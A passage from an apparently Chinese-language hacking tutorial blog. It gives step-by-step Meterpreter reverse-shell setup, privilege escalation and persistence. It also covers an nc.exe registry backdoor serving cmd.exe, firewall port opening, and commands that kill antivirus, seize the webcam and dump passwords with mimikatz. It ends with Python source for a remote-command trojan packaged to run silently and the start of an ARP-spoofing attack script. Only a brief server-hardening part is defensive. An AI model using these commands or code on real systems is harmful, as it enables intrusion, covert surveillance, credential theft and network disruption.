alt=\"\"></p>\n<p>执行后会在当前目录下生成一个 4.exe 文件</p>\n<h2 id=\"kali-监听\"><a class=\"anchor\" href=\"#kali-监听\">#</a> kali 监听</h2>\n<p>kali 分别执行以下命令</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>msfconsole</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use exploit/multi/handler</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload windows/x64/meterpreter/reverse_tcp <span class=\"token comment\"># 如果位 x86 则去除 x64 目录</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> lhost <span class=\"token number\">192.168</span>.47.129 <span class=\"token comment\"># 设置监听机</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>run <span class=\"token comment\"># 开始监听</span></pre></td></tr></tbody></table></figure><p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_2.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_3.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_4.jpg\" alt=\"\"></p>\n<h2 id=\"上传并使用木马\"><a class=\"anchor\" href=\"#上传并使用木马\">#</a> 上传并使用木马</h2>\n<p>在蚁剑上传该木马到网站的根目录</p>\n<p>使用蚁剑的虚拟终端，输入 <code>4.exe</code> , 运行上传的文件，可以看到 kali 机获得了命令窗口</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_8.jpg\" alt=\"\"></p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_5.jpg\" alt=\"\"></p>\n<p>输入 <code>getuid</code> ，可以看到为管理员权限，然后可以输入 <code>getsystem</code>  获取系统权限</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_6.jpg\" alt=\"\"></p>\n<p>使用命令 <code>run persistence -S -U -X -i 5 -p 4444 -r 192.168.47.129</code>  留后门，当目标机重启且 kali 攻击机开启监听时，会自动获取命令窗口</p>\n<p><img data-src=\"../post_images/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/webshell%E6%8F%90%E6%9D%83_7.jpg\" alt=\"\"></p>\n<h1 id=\"37-渗透信息收集\"><a class=\"anchor\" href=\"#37-渗透信息收集\">#</a> 3.7 渗透信息收集</h1>\n<h2 id=\"反弹连接木马获取-shell\"><a class=\"anchor\" href=\"#反弹连接木马获取-shell\">#</a> 反弹连接木马获取 shell</h2>\n<p>同上面 webshell 提权的获取 shell 方法，利用 msfvenom 生成一个木马并使目标机运行</p>\n<p><code>getuid</code>  查看当前用户</p>\n<p><code>net user</code>  查看所有用户 (无法使用时，输入 shell 弹出 cmd 的窗口)</p>\n<p><code>net user 用户名</code> 查看该用户在哪个用户组，有什么权限</p>\n<h2 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h2>\n<p>-UAC (User Account Control 用户账户控制)</p>\n<p>要求用户在执行可能影响计算机运行的操作或执行更改影响其他用户的设置的操作之前，提供权限或管理员密码</p>\n<p>-UAC 绕过提权</p>\n<p>Exploit/windows/local/ask</p>\n<p>// 高等级执行绕过 uac----- 需要用户确认</p>\n<p>use exploit/windows/local/bypassuac</p>\n<p>// 无弹窗的 uac 绕过</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>background # 将会话放到后台</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>session # 查看当前拥有会话</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>session -i 编号 # 进入指定编号的会话</pre></td></tr></tbody></table></figure><p>（利用 ms17-010 永恒之蓝获取 system 权限）</p>\n<h2 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h2>\n<p>Msf 下进行信息收集:</p>\n<ul>\n<li>\n<p>Run post/windows/gather/forensics/enum_drives// 获取目标机器的分区情况</p>\n</li>\n<li>\n<p>Run post/windows/gather/checkvm// 判断是否为虚拟机</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_services// 开启哪些服务</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_applications// 安装了那些应用</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_shares// 查看共享</p>\n</li>\n<li>\n<p>Run post/windows/gather/dumplinks.// 获取主机最近的系统操作</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_applications// 查看补丁</p>\n</li>\n<li>\n<p>Run post/windows/manage/killav// 命令关闭目标机系统杀毒软件。</p>\n</li>\n<li>\n<p>Run post/windows/manage/enable_rdp// 命令启动目标机的远程桌面协议，也就是常说的 3389 端口</p>\n</li>\n<li>\n<p>Run post/windows/mange/autoroute// 命令查看目标机的本地子网情况。</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_logged_on_users// 命令列举当前有多少用户登录了自标机”</p>\n</li>\n<li>\n<p>Run post/windows/gather/enum_applications// 命令列举安装在目标机上的应用程序</p>\n</li>\n<li>\n<p>screenshot // 截图</p>\n</li>\n<li>\n<p>webcam_list // 查看目标机是否有摄像头</p>\n</li>\n<li>\n<p>webcam_snap // 打开目标摄像头，拍一张照片</p>\n</li>\n<li>\n<p>webcam_stream // 开启直播模式</p>\n</li>\n<li>\n<p>shll // 进入目标机的 shell 下面</p>\n</li>\n<li>\n<p>exit // 停止 meterpreter 会话</p>\n</li>\n<li>\n<p>文件系统命令</p>\n<ul>\n<li>\n<p>pwd 或 getwd // 查看当前处于的目录</p>\n</li>\n<li>\n<p>getlwd // 查看</p>\n</li>\n<li>\n<p>ls</p>\n</li>\n<li>\n<p>cd</p>\n</li>\n<li>\n<p>search -f *.txt -d c:\\ // 搜索 c 盘下所有以 '.txt' 为后缀的文件，-f 用于指定搜索文件模式，-d 用于指定在哪个目录下进行</p>\n</li>\n</ul>\n</li>\n<li>\n<p>hash 破解登陆密码（mimikatz 现在改为 kimi，使用命令也有所不同，具体见 help)</p>\n<ul>\n<li>\n<p>meterpreter &gt; load mimikatz // 启动 mimikatz 模块</p>\n</li>\n<li>\n<p>meterpreter &gt; help // 查看帮助</p>\n</li>\n<li>\n<p>meterpreter &gt; msv // 获取登录密码的 hash 值</p>\n</li>\n<li>\n<p>meterpreter &gt; mimikatz_command -f samdump::hashes // 获取登录密码的 hash 值</p>\n</li>\n<li>\n<p>meterpreter &gt; ssp // 获取的是明文信息</p>\n</li>\n<li>\n<p>meterpreter &gt; tspkg // 获取的是明文信息</p>\n</li>\n<li>\n<p>meterpreter &gt; wdigest // 读取内存中存放的账号密码明文信息</p>\n</li>\n<li>\n<p>meterpreter &gt; kerberos // 获取明文密码</p>\n</li>\n</ul>\n</li>\n</ul>\n<p>或者运行以下脚本</p>\n<ul>\n<li>\n<p>run Scraper</p>\n</li>\n<li>\n<p>run Winenum</p>\n</li>\n</ul>\n<p>获取常用的信息</p>\n<h1 id=\"38-nc-后门\"><a class=\"anchor\" href=\"#38-nc-后门\">#</a> 3.8 NC 后门</h1>\n<h2 id=\"ms17-010-获取系统权限\"><a class=\"anchor\" href=\"#ms17-010-获取系统权限\">#</a> ms17-010 获取系统权限</h2>\n<h2 id=\"nc-后门\"><a class=\"anchor\" href=\"#nc-后门\">#</a> Nc 后门</h2>\n<h3 id=\"上传-nc-后门\"><a class=\"anchor\" href=\"#上传-nc-后门\">#</a> 上传 nc 后门</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>upload /root/nc.exe c:<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>windows<span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>system32</pre></td></tr></tbody></table></figure><h3 id=\"修改注册表\"><a class=\"anchor\" href=\"#修改注册表\">#</a> 修改注册表</h3>\n<p>+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run // 查看键值</p>\n<ul>\n<li>\n<p><code>reg setval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v nc -d 'C:\\windows\\system32\\nc.exe -Ldp 4444 -e cmd.exe'</code> // 添加 nc 键值</p>\n<p>-k 为注册表路径 -v 为进程名 -d 后为启动程序所在位置 4444 为服务端口号 -e 返回内容（cmd.exe 返回系统的交互窗口）</p>\n</li>\n<li>\n<p><code>reg queryval -k HKLM\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run -v nc</code> // 查看</p>\n</li>\n</ul>\n<p>重启，可以发现防火墙阻止了网络功能，这里需要关闭防火墙或者通过之前获得权限，将端口写入到防火墙中允许的端口中</p>\n<h3 id=\"防火墙允许端口添加时防火墙应处于关闭状态\"><a class=\"anchor\" href=\"#防火墙允许端口添加时防火墙应处于关闭状态\">#</a> 防火墙，允许端口（添加时，防火墙应处于关闭状态）</h3>\n<ul>\n<li>\n<p>execute -f cmd -i -H // 生成 shell (或者输入 shell)</p>\n</li>\n<li>\n<p>cmd：netsh firewall show opmode // 查看防火墙状态</p>\n</li>\n<li>\n<p>netsh firewall add portopening TCP 444 \"textx\" ENABLE ALL</p>\n</li>\n<li>\n<p>netsh firewall add portopening TCP 4444 \"FireWall\" ENABLE ALL</p>\n</li>\n<li>\n<p>netsh firewall add portopening TCP 7776 \"QQ\" ENABLE ALL</p>\n</li>\n</ul>\n<h1 id=\"39-内网转发穿透\"><a class=\"anchor\" href=\"#39-内网转发穿透\">#</a> 3.9 内网转发穿透</h1>\n<h2 id=\"获取内网服务器的-session\"><a class=\"anchor\" href=\"#获取内网服务器的-session\">#</a> 获取内网服务器的 session</h2>\n<ul>\n<li>\n<p>配置 frp 穿透：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycA==\">https://github.com/fatedier/frp</span></p>\n</li>\n<li>\n<p>端口映射，假设靶机 4444 端口映射到公网的 6002 端口</p>\n</li>\n<li>\n<p>使用木马反弹 session</p>\n<ul>\n<li>\n<p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=g 公网 ip LPORT=6002 (即转发到的公网端口) -f exe &gt;test.exe</p>\n</li>\n<li>\n<p>生成一个 test.exe 木马</p>\n</li>\n</ul>\n</li>\n<li>\n<p>选择模块监听</p>\n<ul>\n<li>\n<p>use exploit/multi/handler</p>\n</li>\n<li>\n<p>set payload windows/meterpreter/reverse_tcp</p>\n</li>\n<li>\n<p>set lhost 攻击机 ip</p>\n</li>\n<li>\n<p>set lport 4444 攻击机监听端口</p>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"内网代理转发\"><a class=\"anchor\" href=\"#内网代理转发\">#</a> 内网代理转发</h2>\n<h3 id=\"内网探测\"><a class=\"anchor\" href=\"#内网探测\">#</a> 内网探测</h3>\n<p>msf 中，获取到一台机子的 session 后 (该机子可以访问内网的机器)</p>\n<ul>\n<li>\n<p>run post/windows/gather/arp_scanner rhost = 内网 ip（如 192.168.1.0/24） 扫描内网中的 (192.168.1.0) 网段</p>\n</li>\n<li>\n<p>run post/multi/manage/autoroute// 自动添加路由</p>\n</li>\n<li>\n<p>run autoroute -s 192.168.2.1/24 // 添加 192.168.2.1/24 的路由</p>\n</li>\n<li>\n<p>run autoroute -p // 查看路由条目</p>\n</li>\n<li>\n<p>但此时 nmap 扫描无法扫出，需要使用 socks 代理</p>\n</li>\n<li>\n<p>同样的 msf 中</p>\n<ul>\n<li>\n<p>use auxiliary/sever/socks4a// 设置 socks 代理服务器</p>\n</li>\n<li>\n<p>set SRVHOST ip</p>\n</li>\n<li>\n<p>set SRVPORT port</p>\n</li>\n</ul>\n</li>\n<li>\n<p>设置 proxychains 代理</p>\n<ul>\n<li>\n<p>vim /etc/proxychains.conf</p>\n<p>设置 socks4 之前设置的 socks 的 ip 设置的端口</p>\n</li>\n</ul>\n</li>\n<li>\n<p>使用 proxychains</p>\n<ul>\n<li>proxychains nmap -sT -sV --script=vuln 目标内网机 ip</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"310-服务器安全加固\"><a class=\"anchor\" href=\"#310-服务器安全加固\">#</a> 3.10 服务器安全加固</h1>\n<p>给出服务器的 ssh 账号密码</p>\n<p>例子为 zzcms 网站 (相关漏洞可以搜索查找)</p>\n<h2 id=\"获取服务器的系统信息\"><a class=\"anchor\" href=\"#获取服务器的系统信息\">#</a> 获取服务器的系统信息</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">cat</span> /etc/*release*</pre></td></tr></tbody></table></figure><h2 id=\"查看开启端口\"><a class=\"anchor\" href=\"#查看开启端口\">#</a> 查看开启端口</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">netstat</span> <span class=\"token parameter variable\">-antp</span></pre></td></tr></tbody></table></figure><p>发现开启 3306 (mysql),6379 (redis),22 (ssh),80 (http)</p>\n<h2 id=\"查看进程\"><a class=\"anchor\" href=\"#查看进程\">#</a> 查看进程</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ps</span> <span class=\"token parameter variable\">-ef</span></pre></td></tr></tbody></table></figure><p>显示所有进程</p>\n<h2 id=\"找寻突破口\"><a class=\"anchor\" href=\"#找寻突破口\">#</a> 找寻突破口</h2>\n<h3 id=\"3306-mysql\"><a class=\"anchor\" href=\"#3306-mysql\">#</a> 3306 mysql</h3>\n<ul>\n<li>\n<p>找寻配置文件，查看是否有密码</p>\n</li>\n<li>\n<p>爆破进入</p>\n</li>\n<li>\n<p>是否允许远程登录 (通过数据库访问，查看数据库用户信息 (user 表))</p>\n</li>\n<li>\n<p>查表，查看各种账户信息 (管理员之类的账号，根据其密码形式 (如弱密码)，进行修改 (网页修改 / 数据库修改))</p>\n</li>\n</ul>\n<h3 id=\"6379-redis\"><a class=\"anchor\" href=\"#6379-redis\">#</a> 6379 redis</h3>\n<p>查看启动目录下的 redis 脚本 <code>vim /etc/init.d/redis</code></p>\n<p>redis 默认密码 <code>foobared</code>  修改密码</p>\n<p>修改好后需要重启</p>\n<ul>\n<li>\n<p>再次运行 redis 脚本</p>\n</li>\n<li>\n<p>如果上面一条不行，那么可以使用 kill 杀掉进程</p>\n<ul>\n<li>\n<p>首先使用 <code>ps -ef | grep redis</code>  获取进程号</p>\n</li>\n<li>\n<p>然后使用 kill 命令 <code>kill 进程号</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"311-手把手自编木马\"><a class=\"anchor\" href=\"#311-手把手自编木马\">#</a> 3.11 手把手自编木马</h1>\n<h2 id=\"自编远程控制电脑木马\"><a class=\"anchor\" href=\"#自编远程控制电脑木马\">#</a> 自编远程控制电脑木马</h2>\n<h3 id=\"涉及知识或技术\"><a class=\"anchor\" href=\"#涉及知识或技术\">#</a> 涉及知识或技术</h3>\n<ul>\n<li>\n<p>操作系统</p>\n<ul>\n<li>\n<p>win/linux/android</p>\n</li>\n<li>\n<p>命令、服务、特性 (不同系统下)、</p>\n</li>\n</ul>\n</li>\n<li>\n<p>网络协议</p>\n<ul>\n<li>\n<p>osi 七层网络</p>\n</li>\n<li>\n<p>tcp/ip 协议族群</p>\n</li>\n<li>\n<p>应用层</p>\n</li>\n<li>\n<p>传输层 /tcp/udp</p>\n</li>\n<li>\n<p>网络层</p>\n</li>\n<li>\n<p>链路层</p>\n</li>\n</ul>\n</li>\n<li>\n<p>程序语言</p>\n<ul>\n<li>\n<p>python</p>\n<ul>\n<li>\n<p>环境简单</p>\n</li>\n<li>\n<p>弱规则</p>\n</li>\n<li>\n<p>第三方库</p>\n</li>\n<li>\n<p>以及自定义的库或模块</p>\n</li>\n</ul>\n</li>\n<li>\n<p>go</p>\n</li>\n<li>\n<p>ruby</p>\n</li>\n<li>\n<p>html，js</p>\n</li>\n</ul>\n</li>\n<li>\n<p>打包工具</p>\n</li>\n</ul>\n<h3 id=\"编写\"><a class=\"anchor\" href=\"#编写\">#</a> 编写</h3>\n<p>server</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># server: 放在被攻击机 - 木马</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># dos 下</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> socket <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 创建连接 tcp</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>qq <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 绑定主机 ip</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>address <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">12345</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>qq<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>qq<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    newsct<span class=\"token punctuation\">,</span> clientsct <span class=\"token operator\">=</span> qq<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        cmd <span class=\"token operator\">=</span> newsct<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\">#接收到的各种指令，4096 为大小</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token comment\"># 判断 cmd 是否有内容</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"console:\"</span> <span class=\"token operator\">+</span> cmd<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token comment\"># 以下可以做控制操作</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            res <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>popen<span class=\"token punctuation\">(</span>cmd<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            newsct<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            res<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    newsct<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><p>client</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># client 控制端</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> socket <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>tcpsocket <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">(</span>AF_INET<span class=\"token punctuation\">,</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>setAddress <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'127.0.0.1'</span><span class=\"token punctuation\">,</span><span class=\"token number\">12345</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>tcpsocket<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span>setAddress<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    sendcmd <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'client&gt;&gt;'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sendcmd<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        tcpsocket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>sendcmd<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token comment\"># 接收执行后的结果</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    resv <span class=\"token operator\">=</span> tcpsocket<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">4096</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>recv<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\"># close</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>tcpsocket<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h3 id=\"打包\"><a class=\"anchor\" href=\"#打包\">#</a> 打包</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>pyinstaller <span class=\"token parameter variable\">-F</span> server.py <span class=\"token parameter variable\">-w</span> <span class=\"token comment\"># -w 为后台静默运行</span></pre></td></tr></tbody></table></figure><h1 id=\"312-实战自编阻网小军刀-木马-蠕虫\"><a class=\"anchor\" href=\"#312-实战自编阻网小军刀-木马-蠕虫\">#</a> 3.12 实战自编阻网小军刀、木马、蠕虫</h1>\n<h2 id=\"涉及技术\"><a class=\"anchor\" href=\"#涉及技术\">#</a> 涉及技术</h2>\n<ul>\n<li>网络技术</li>\n<li>内网渗透</li>\n<li>数据包和头部定义</li>\n<li>实用编程语言 python</li>\n</ul>\n<h2 id=\"编写-2\"><a class=\"anchor\" href=\"#编写-2\">#</a> 编写</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : zhong</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>since        : 2022-08-26 10:20:00</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>LastAuthor   : zhong</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>lastTime     : 2022-08-26 10:41:31</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>blog         : http://dpm12345.cn/</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>email        : 1006975692@qq.com</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 攻击指定 ip 实现断网 - ARP</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 原理：通过扫描当前攻击机的 IP 地址，得到内网的所有 ip 所在网关</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 组成 ARP 数据包，对网关内的主机先发起 Ping，有发现主机存活</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 获得存活 ip 列表，选择需要攻击 ip，发起攻击</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 步骤</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># 1. 获得当前的 ip 及网关  route print</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># 2. 封装 ARP 数据包，以太网的包结构形式来发起 ping，得到存活主机列表</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># 3. 得到存活主机列表</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># 4. 选择需要攻击或阻网的 ip</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\"># 5.ARP 攻击 (封包 / 发包)---》代理，抓包</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\"># 6. 设置攻击时长</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\"># pip install scapy</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">from</span> scapy<span class=\"token punctuation\">.</span><span class=\"token builtin\">all</span> <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">scan2spoof</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 